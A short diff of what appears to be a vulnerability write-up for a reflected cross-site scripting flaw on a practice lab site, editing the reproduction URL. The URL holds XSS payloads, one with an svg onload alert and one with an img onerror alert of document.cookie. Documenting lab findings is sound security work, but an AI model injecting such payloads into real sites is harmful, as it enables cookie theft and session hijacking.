@@ -15,7 +15,7 @@ https://labs.krazeplanet.com/56.php?p=
 Steps to Reproduce : 
 
 1. Log in to the application at  https://labs.krazeplanet.com/56.php  with Valid account. 
-2. Navigate to the following URL : ```https://labs.krazeplanet.com/55.php?search=Game1</script><svg onload="alert(1)">](http://kzlabs.com/56.php?p=Game1%27%3E%3Cimg+src%3Da+onerror%3Dalert%28document.cookie%29%3E)```
+2. Navigate to the following URL : ```https://labs.krazeplanet.com/55.php?p=Game1</script><svg onload="alert(1)">](http://kzlabs.com/56.php?p=Game1%27%3E%3Cimg+src%3Da+onerror%3Dalert%28document.cookie%29%3E)```
 4. Observe that an alert box displaying , indicating that the JavaScript code was executed.
 
 ## Payload Used
